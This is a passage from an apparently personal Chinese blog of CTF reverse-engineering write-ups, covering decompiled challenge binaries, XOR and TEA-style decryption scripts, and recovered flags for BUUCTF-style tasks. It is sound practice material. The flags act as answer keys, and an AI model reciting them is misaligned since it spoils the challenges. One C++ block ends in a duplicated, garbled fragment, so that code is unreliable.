class="comment">///////////////////////////////////////////////////////////////</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">0x1B</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ((<span class="type">unsigned</span> __int8)i ^ (<span class="type">unsigned</span> __int8)byte_4212C0[i]) != byte_41EA08[i] )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_401020((<span class="type">int</span>)<span class="string">&quot;Right!\n&quot;</span>);</span><br><span class="line">  sub_404B7E(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  <span class="comment">/////////////////////////////////////////////////////////</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>根据函数，其实很简单，就是一个简单的异或。</p>
<p>所以就可以编写脚本了。</p>
<p>这里注意一下，密文还有个”M“要加上</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607904.png" alt="image-20240410191557237"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">byte=<span class="string">&#x27;MSAWB~FXZ:J:`tQJ&quot;N@ bpdd&#125;8g&#x27;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="built_in">len</span>(byte)):</span><br><span class="line">    flag+=<span class="built_in">chr</span>(i^<span class="built_in">ord</span>(byte[i]))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>最后得到flag为    MRCTF{@_R3@1ly_E2_R3verse!}              很简单！</p>
<h2 id="MRCTF2020-hello-world-go"><a href="#MRCTF2020-hello-world-go" class="headerlink" title="[MRCTF2020]hello_world_go"></a>[MRCTF2020]hello_world_go</h2><p>2024.4.10</p>
<p>64位，找不到main函数，搜索一下flag，就找到了</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031445929.png" alt="image-20240410194742790"></p>
<p>签到题，应该</p>
<p>​                                                flag{hello_world_gogogo}</p>
<h2 id="WUSTCTF2020-level3"><a href="#WUSTCTF2020-level3" class="headerlink" title="[WUSTCTF2020]level3"></a>[WUSTCTF2020]level3</h2><p>先放着</p>
<h2 id="Youngter-drive"><a href="#Youngter-drive" class="headerlink" title="Youngter-drive"></a>Youngter-drive</h2><p>2024.4.10</p>
<p>32位，有壳</p>
<p>upx 脱一下壳子</p>
<p>找不到什么有用的</p>
<p> 上网搜了一下，用的多线程和IDA平衡堆栈的知识！</p>
<p>​                              <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46009088/article/details/109362576">BUUCTF_Youngter-drive_buuctf_youngter-drive_buuctf youngter-drive_zyen12-CSDN博客</a></p>
<p>放一放</p>
<h2 id="相机"><a href="#相机" class="headerlink" title="相机"></a>相机</h2><p>2024.4.11</p>
<p>后缀为.apk,工具为jadx</p>
<p>​                                              [<a target="_blank" rel="noopener" href="https://blog.csdn.net/mcmuyanga/article/details/110090189">BUUCTF]REVERSE——相册_reverse题 你好这是上次聚会照片-CSDN博客</a></p>
<p>看了一下别人的wp。我们用jadx打开后基本什么也找不到</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031445250.png" alt="image-20240411193145298"></p>
<p>有个base64的提示，找一下密文。</p>
<p>把jadx解压一下，方法直接用ida打开，找到</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031445188.png" alt="image-20240411193301764"></p>
<p>查看一下字符串</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031445043.png" alt="image-20240411193434817"></p>
<p>找到密文就可以进行base64解密了。这里我用的在线工具</p>
<p>​                    <a target="_blank" rel="noopener" href="https://cyberchef.org/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=TVRneU1UZzBOalV4TWpWQU1UWXpMbU52YlE9PQ">From Base64 - CyberChef</a></p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031445588.png" alt="image-20240411192656434"></p>
<p>所以flag{<a href="mailto:&#49;&#56;&#x32;&#x31;&#56;&#x34;&#x36;&#x35;&#x31;&#x32;&#x35;&#64;&#49;&#x36;&#51;&#46;&#x63;&#x6f;&#109;">&#49;&#56;&#x32;&#x31;&#56;&#x34;&#x36;&#x35;&#x31;&#x32;&#x35;&#64;&#49;&#x36;&#51;&#46;&#x63;&#x6f;&#109;</a>}</p>
<h2 id="FlareOn4-IgniteMe"><a href="#FlareOn4-IgniteMe" class="headerlink" title="[FlareOn4]IgniteMe"></a>[FlareOn4]IgniteMe</h2><p>2024.4.11</p>
<p>32位，无壳</p>
<p>代码不长</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">start</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  DWORD NumberOfBytesWritten; <span class="comment">// [esp+0h] [ebp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  NumberOfBytesWritten = <span class="number">0</span>;</span><br><span class="line">  hFile = GetStdHandle(<span class="number">0xFFFFFFF6</span>);</span><br><span class="line">  dword_403074 = GetStdHandle(<span class="number">0xFFFFFFF5</span>);</span><br><span class="line">  WriteFile(dword_403074, aG1v3M3T3hFl4g, <span class="number">0x13</span>u, &amp;NumberOfBytesWritten, <span class="number">0</span>);</span><br><span class="line">  sub_4010F0(NumberOfBytesWritten);</span><br><span class="line"><span class="comment">/////////////////////////////////////////</span></span><br><span class="line">  <span class="keyword">if</span> ( sub_401050() )                 <span class="comment">///</span></span><br><span class="line"><span class="comment">/////////////////////////////////////////</span></span><br><span class="line">    WriteFile(dword_403074, aG00dJ0b, <span class="number">0xA</span>u, &amp;NumberOfBytesWritten, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    WriteFile(dword_403074, aN0tT00H0tRWe7r, <span class="number">0x24</span>u, &amp;NumberOfBytesWritten, <span class="number">0</span>);</span><br><span class="line">  ExitProcess(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>大概猜一下，就在这个if条件语句里了应该，点进去看看</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607905.png" alt="image-20240411205456789"></p>
<p>简单分析一下这个函数，我们可以通过调试得知，v1和v4的值</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031446941.png" alt="image-20240411210636407"></p>
<p><strong>v1&#x3D;7，v4&#x3D;0x04；</strong></p>
<p>然后我们进行了第一个for循环</p>
<p>是一个简单的异或</p>
<p>下面的for循环分析一下应该是一个判断条件。</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607906.png" alt="image-20240412194643187"></p>
<p>找一下密文</p>
<p>密文如下：</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607907.png" alt="image-20240411205619052"></p>
<p>感觉是这个</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> ida_chars[] =</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">13</span>,  <span class="number">38</span>,  <span class="number">73</span>,  <span class="number">69</span>,  <span class="number">42</span>,  <span class="number">23</span>, <span class="number">120</span>,  <span class="number">68</span>,  <span class="number">43</span>, <span class="number">108</span>, </span><br><span class="line">   <span class="number">93</span>,  <span class="number">94</span>,  <span class="number">69</span>,  <span class="number">18</span>,  <span class="number">47</span>,  <span class="number">23</span>,  <span class="number">43</span>,  <span class="number">68</span>, <span class="number">111</span>, <span class="number">110</span>, </span><br><span class="line">   <span class="number">86</span>,   <span class="number">9</span>,  <span class="number">95</span>,  <span class="number">69</span>,  <span class="number">71</span>, <span class="number">115</span>,  <span class="number">38</span>,  <span class="number">10</span>,  <span class="number">13</span>,  <span class="number">19</span>, </span><br><span class="line">   <span class="number">23</span>,  <span class="number">72</span>,  <span class="number">66</span>,   <span class="number">1</span>,  <span class="number">64</span>,  <span class="number">77</span>,  <span class="number">12</span>,   <span class="number">2</span>, <span class="number">105</span>,   <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> ida_chars[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x0D</span>, <span class="number">0x26</span>, <span class="number">0x49</span>, <span class="number">0x45</span>, <span class="number">0x2A</span>, <span class="number">0x17</span>, <span class="number">0x78</span>, <span class="number">0x44</span>, <span class="number">0x2B</span>, <span class="number">0x6C</span>, </span><br><span class="line">  <span class="number">0x5D</span>, <span class="number">0x5E</span>, <span class="number">0x45</span>, <span class="number">0x12</span>, <span class="number">0x2F</span>, <span class="number">0x17</span>, <span class="number">0x2B</span>, <span class="number">0x44</span>, <span class="number">0x6F</span>, <span class="number">0x6E</span>, </span><br><span class="line">  <span class="number">0x56</span>, <span class="number">0x09</span>, <span class="number">0x5F</span>, <span class="number">0x45</span>, <span class="number">0x47</span>, <span class="number">0x73</span>, <span class="number">0x26</span>, <span class="number">0x0A</span>, <span class="number">0x0D</span>, <span class="number">0x13</span>, </span><br><span class="line">  <span class="number">0x17</span>, <span class="number">0x48</span>, <span class="number">0x42</span>, <span class="number">0x01</span>, <span class="number">0x40</span>, <span class="number">0x4D</span>, <span class="number">0x0C</span>, <span class="number">0x02</span>, <span class="number">0x69</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<p>然后编写脚本跑一下，看看对不对</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#data=  [ 13,  38,  73,  69,  42,  23, 120,  68,  43, 108,  93,  94,  69,  18,  47,  23,  43,  68, 111, 110, 86,   9,  95,  69,  71, 115,  38,  10,  13,  19, 23,  72,  66,   1,  64,  77,  12,   2, 105,   0]</span></span><br><span class="line">data=[  <span class="number">0x0D</span>, <span class="number">0x26</span>, <span class="number">0x49</span>, <span class="number">0x45</span>, <span class="number">0x2A</span>, <span class="number">0x17</span>, <span class="number">0x78</span>, <span class="number">0x44</span>, <span class="number">0x2B</span>, <span class="number">0x6C</span>, </span><br><span class="line">  <span class="number">0x5D</span>, <span class="number">0x5E</span>, <span class="number">0x45</span>, <span class="number">0x12</span>, <span class="number">0x2F</span>, <span class="number">0x17</span>, <span class="number">0x2B</span>, <span class="number">0x44</span>, <span class="number">0x6F</span>, <span class="number">0x6E</span>, </span><br><span class="line">  <span class="number">0x56</span>, <span class="number">0x09</span>, <span class="number">0x5F</span>, <span class="number">0x45</span>, <span class="number">0x47</span>, <span class="number">0x73</span>, <span class="number">0x26</span>, <span class="number">0x0A</span>, <span class="number">0x0D</span>, <span class="number">0x13</span>, </span><br><span class="line">  <span class="number">0x17</span>, <span class="number">0x48</span>, <span class="number">0x42</span>, <span class="number">0x01</span>, <span class="number">0x40</span>, <span class="number">0x4D</span>, <span class="number">0x0C</span>, <span class="number">0x02</span>, <span class="number">0x69</span>]</span><br><span class="line">data.reverse()</span><br><span class="line">key=  <span class="number">0x4</span></span><br><span class="line">flag =<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i  <span class="keyword">in</span> <span class="built_in">range</span> (<span class="built_in">len</span>(data)):    </span><br><span class="line">     flag+= <span class="built_in">chr</span>(key^data[i])</span><br><span class="line">     key=<span class="built_in">ord</span>(flag[i])</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line"><span class="built_in">print</span>(flag[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure>



<p>最后flag{<a href="mailto:&#x52;&#x5f;&#x79;&#x30;&#x75;&#x5f;&#72;&#x30;&#116;&#95;&#x33;&#110;&#48;&#117;&#103;&#x48;&#x5f;&#116;&#x30;&#x5f;&#49;&#103;&#110;&#x31;&#x74;&#x33;&#x40;&#102;&#x6c;&#97;&#x72;&#x65;&#45;&#x6f;&#110;&#x2e;&#x63;&#x6f;&#x6d;">&#x52;&#x5f;&#x79;&#x30;&#x75;&#x5f;&#72;&#x30;&#116;&#95;&#x33;&#110;&#48;&#117;&#103;&#x48;&#x5f;&#116;&#x30;&#x5f;&#49;&#103;&#110;&#x31;&#x74;&#x33;&#x40;&#102;&#x6c;&#97;&#x72;&#x65;&#45;&#x6f;&#110;&#x2e;&#x63;&#x6f;&#x6d;</a>}</p>
<p>不过这里的脚本有个反转，解密前反转要看不太懂</p>
<h2 id="WUSTCTF2020-Cr0ssfun"><a href="#WUSTCTF2020-Cr0ssfun" class="headerlink" title="[WUSTCTF2020]Cr0ssfun"></a>[WUSTCTF2020]Cr0ssfun</h2><p>2024.4.11</p>
<p>64位，无壳 </p>
<p>打开main函数，F5反编译一下看看</p>
<p> <img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031446325.png" alt="image-20240412203936561"></p>
<p>条件给的也很简单，就是下面这个</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031446146.png" alt="image-20240412204450121"></p>
<p>点一下check，里面是这样的</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031446393.png" alt="image-20240412204532038"></p>
<p>有点套娃的感觉，把他们都记录下来</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">a[<span class="number">1</span>]=<span class="string">&#x27;c&#x27;</span></span><br><span class="line">a[<span class="number">2</span>]=<span class="string">&#x27;t&#x27;</span></span><br><span class="line">a[<span class="number">3</span>]=<span class="string">&#x27;f&#x27;</span></span><br><span class="line">a[<span class="number">4</span>]=<span class="string">&#x27;2&#x27;</span></span><br><span class="line">a[<span class="number">5</span>]=<span class="string">&#x27;0&#x27;</span></span><br><span class="line">a[<span class="number">6</span>]=<span class="string">&#x27;2&#x27;</span></span><br><span class="line">a[<span class="number">7</span>]=<span class="string">&#x27;0&#x27;</span></span><br><span class="line">a[<span class="number">8</span>]=<span class="string">&#x27;&#123;&#x27;</span></span><br><span class="line">a[<span class="number">9</span>]=<span class="string">&#x27;c&#x27;</span></span><br><span class="line">a[<span class="number">10</span>]=<span class="string">&#x27;p&#x27;</span></span><br><span class="line">a[<span class="number">11</span>]=<span class="string">&#x27;p&#x27;</span></span><br><span class="line">a[<span class="number">12</span>]=<span class="string">&#x27;_&#x27;</span></span><br><span class="line">a[<span class="number">13</span>]=<span class="string">&#x27;@&#x27;</span></span><br><span class="line">a[<span class="number">14</span>]=<span class="string">&#x27;n&#x27;</span></span><br><span class="line">a[<span class="number">15</span>]=<span class="string">&#x27;d&#x27;</span></span><br><span class="line">a[<span class="number">16</span>]=<span class="string">&#x27;_&#x27;</span></span><br><span class="line">a[<span class="number">17</span>]=<span class="string">&#x27;r&#x27;</span></span><br><span class="line">a[<span class="number">18</span>]=<span class="string">&#x27;3&#x27;</span></span><br><span class="line">a[<span class="number">19</span>]=<span class="string">&#x27;v&#x27;</span></span><br><span class="line">a[<span class="number">20</span>]=<span class="string">&#x27;e&#x27;</span></span><br><span class="line">a[<span class="number">21</span>]=<span class="string">&#x27;r&#x27;</span></span><br><span class="line">a[<span class="number">22</span>]=<span class="string">&#x27;s&#x27;</span></span><br><span class="line">a[<span class="number">23</span>]=<span class="string">&#x27;e&#x27;</span></span><br><span class="line">a[<span class="number">24</span>]=<span class="string">&#x27;_&#x27;</span></span><br><span class="line">a[<span class="number">25</span>]=<span class="string">&#x27;@&#x27;</span></span><br><span class="line">a[<span class="number">26</span>]=<span class="string">&#x27;r&#x27;</span></span><br><span class="line">a[<span class="number">27</span>]=<span class="string">&#x27;e&#x27;</span></span><br><span class="line">a[<span class="number">28</span>]=<span class="string">&#x27;_&#x27;</span></span><br><span class="line">a[<span class="number">29</span>]=<span class="string">&#x27;f&#x27;</span></span><br><span class="line">a[<span class="number">30</span>]=<span class="string">&#x27;u&#x27;</span></span><br><span class="line">a[<span class="number">31</span>]=<span class="string">&#x27;n&#x27;</span></span><br><span class="line">a[<span class="number">32</span>]=<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">a=<span class="string">&#x27;w&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到ctf2020{cpp_@nd_r3verse_@re_fun}</p>
<p>所以flag{cpp_@nd_r3verse_@re_fun}，还是很简单的哈！</p>
<h2 id="GWCTF-2019-xxor"><a href="#GWCTF-2019-xxor" class="headerlink" title="[GWCTF 2019]xxor"></a>[GWCTF 2019]xxor</h2><p>2024.4.17</p>
<p>64位，无壳</p>
<p>找到main函数，F5反汇编</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">  v7[<span class="number">5</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let us play a game?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;you have six chances to input&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Come on!&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="number">40</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="string">&quot;input: &quot;</span>);</span><br><span class="line">    a2 = (<span class="type">char</span> **)((<span class="type">char</span> *)v6 + <span class="number">4</span> * i);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, a2);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memset</span>(v7, <span class="number">0</span>, <span class="number">40</span>);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">2</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    dword_601078 = v6[j];</span><br><span class="line">    dword_60107C = HIDWORD(v6[j]);</span><br><span class="line">    a2 = (<span class="type">char</span> **)&amp;unk_601060;</span><br><span class="line">    sub_400686(&amp;dword_601078, &amp;unk_601060);</span><br><span class="line">    LODWORD(v7[j]) = dword_601078;</span><br><span class="line">    HIDWORD(v7[j]) = dword_60107C;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)sub_400770(v7, a2) != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;NO NO NO~ &quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Congratulation!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You seccess half\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do not forget to change input to hex and combine~\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ByeBye&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>ida远程调控没什么用！</p>
<p>找到最主要的判断条件！</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031446656.png" alt="image-20240417182030334"></p>
<p>当v7和a2相等的时候为我们所求的。</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031446454.png" alt="image-20240417185605237"></p>
<p>函数点进去看一眼，他是几个长整型的数据</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">/////所以我们知道a1的值</span></span><br><span class="line">     a1[<span class="number">2</span>] - a1[<span class="number">3</span>] == <span class="number">2225223423LL</span></span><br><span class="line">    a1[<span class="number">3</span>] + a1[<span class="number">4</span>] == <span class="number">4201428739LL</span></span><br><span class="line">    a1[<span class="number">2</span>] - a1[<span class="number">4</span>] == <span class="number">1121399208LL</span></span><br><span class="line">    *a1 == <span class="number">-548868226</span></span><br><span class="line">    a1[<span class="number">5</span>] == <span class="number">-2064448480</span></span><br><span class="line">    a1[<span class="number">1</span>] == <span class="number">550153460</span></span><br><span class="line"><span class="comment">//根据上面的几个等式，解出2，3，4，这里的al我们看作a[0]</span></span><br><span class="line">         al的所有值： [<span class="number">-548868226</span>, <span class="number">550153460</span>, <span class="number">3774025685</span>, <span class="number">1548802262</span>, <span class="number">2652626477</span>, <span class="number">-2064448480</span>]</span><br></pre></td></tr></table></figure>

<p>我们知道了al的值</p>
<p>调试一下可以知道a2的值</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031446607.png" alt="image-20240417195706729"></p>
<p>然后就可以编写脚本了</p>
<p>脚本如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a1=[-548868226, 550153460, 3774025685, 1548802262, 2652626477, -2064448480]</span><br><span class="line">a2=[2,2,3,4]</span><br></pre></td></tr></table></figure>



<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 a[<span class="number">6</span>] = &#123; <span class="number">3746099070</span>, <span class="number">550153460</span>, <span class="number">3774025685</span>, <span class="number">1548802262</span>, <span class="number">2652626477</span>, <span class="number">2230518816</span> &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> a2[<span class="number">4</span>] = &#123; <span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v3, v4;</span><br><span class="line">    <span class="type">int</span> v5;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= <span class="number">4</span>; j += <span class="number">2</span>) &#123;</span><br><span class="line">        v3 = a[j];</span><br><span class="line">        v4 = a[j + <span class="number">1</span>];</span><br><span class="line">        v5 = <span class="number">1166789954</span>*<span class="number">64</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">63</span>; ++i) &#123;</span><br><span class="line">            v4 -= (v3 + v5 + <span class="number">20</span>) ^ ((v3 &lt;&lt; <span class="number">6</span>) + a2[<span class="number">2</span>]) ^ ((v3 &gt;&gt; <span class="number">9</span>) + a2[<span class="number">3</span>]) ^ <span class="number">16</span>;</span><br><span class="line">            v3 -= (v4 + v5 + <span class="number">11</span>) ^ ((v4 &lt;&lt; <span class="number">6</span>) + *a2) ^ ((v4 &gt;&gt; <span class="number">9</span>) + a2[<span class="number">1</span>]) ^ <span class="number">32</span>;</span><br><span class="line">            v5 -= <span class="number">1166789954</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        a[j] = v3;</span><br><span class="line">        a[j + <span class="number">1</span>] = v4;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i) &#123;</span><br><span class="line">        cout &lt;&lt; *((<span class="type">char</span>*)&amp;a[i] + <span class="number">2</span>) &lt;&lt; *((<span class="type">char</span>*)&amp;a[i] + <span class="number">1</span>) &lt;&lt;  * ((<span class="type">char</span>*)&amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r*)&amp;a[i] + <span class="number">2</span>) &lt;&lt; *((<span class="type">char</span>*)&amp;a[i] + <span class="number">1</span>) &lt;&lt;  * ((<span class="type">char</span>*)&amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>flag{re_is_great!}</p>
<p>脚本放一放！</p>
<h2 id="UTCTF2020-basic-re"><a href="#UTCTF2020-basic-re" class="headerlink" title="[UTCTF2020]basic-re"></a>[UTCTF2020]basic-<strong>re</strong></h2><p>2024.4.17</p>
<p>64位，ELF文件</p>
<p>应该是签到题</p>
<p>进去查看一下字符串</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031446919.png" alt="image-20240417205602314"></p>
<p>​                  flag{str1ngs_1s_y0ur_fr13nd}</p>
<h2 id="FlareOn6-Overlong"><a href="#FlareOn6-Overlong" class="headerlink" title="[FlareOn6]Overlong"></a>[FlareOn6]Overlong</h2><p>2024.4.17</p>
<p>32位，无壳</p>
<p>啥也没有，</p>
<p>新题型，没见过！</p>
<p>​                                             [buuctf刷题记录15 [FlareOn6]Overlong_buuctf<a target="_blank" rel="noopener" href="https://blog.csdn.net/ytj00/article/details/107734647">[flareon6]overlong-CSDN博客</a></p>
<p>是一个简单修改源码值的题！</p>
<p>运行一下exe文件</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031446777.png" alt="image-20240418210005988"></p>
<p>什么也没有</p>
<p>我们点进去，F5反汇编一下，代码很少</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031446151.png" alt="image-20240418205726644"></p>
<p>简单分析一下，就是一个函数，函数把unk_4088的值给TEXT然后有TEXT一个赋值 ，然后TEXT再赋值给这个MessageBox，也就是这个窗口。然后输出</p>
